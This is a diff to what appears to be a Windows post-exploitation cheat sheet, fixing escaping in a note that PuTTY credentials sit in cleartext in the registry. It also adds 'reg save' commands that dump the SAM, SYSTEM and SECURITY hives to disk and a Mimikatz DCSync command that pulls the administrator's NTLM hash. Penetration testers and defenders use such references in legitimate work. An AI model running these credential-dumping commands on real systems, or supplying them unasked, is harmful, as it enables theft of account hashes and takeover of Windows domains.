@@ -302,7 +302,7 @@ reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlo
 ```
 ### Putty Saved Credentials
 
-> Putty credentials are stored in cleartext at this registry key location "Computer\HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions\<SESSION NAME>"
+> Putty credentials are stored in cleartext at this registry key location "Computer\\HKEY_CURRENT_USER\\SOFTWARE\\SimonTatham\\PuTTY\\Sessions\\\<SESSION NAME>"
 
 ### Stored WiFi Credentials
 
@@ -385,3 +385,24 @@ Get-LocalUser
 ```powershell
 Get-WmiObject -Class Win32_OperatingSystem | select Description
 ```
+
+### Dumping SAM, SYSTEM, and SECURITY,
+
+```cmd
+reg save hklm\sam C:\sam
+```
+
+```cmd
+reg save hklm\system C:\system
+```
+
+```cmd
+reg save hklm\security C:\security
+```
+
+### Running MimiKatz to get NTLM Hash
+
+```MimiKatz
+lsadump::dcsync /user:administrator
+```
+
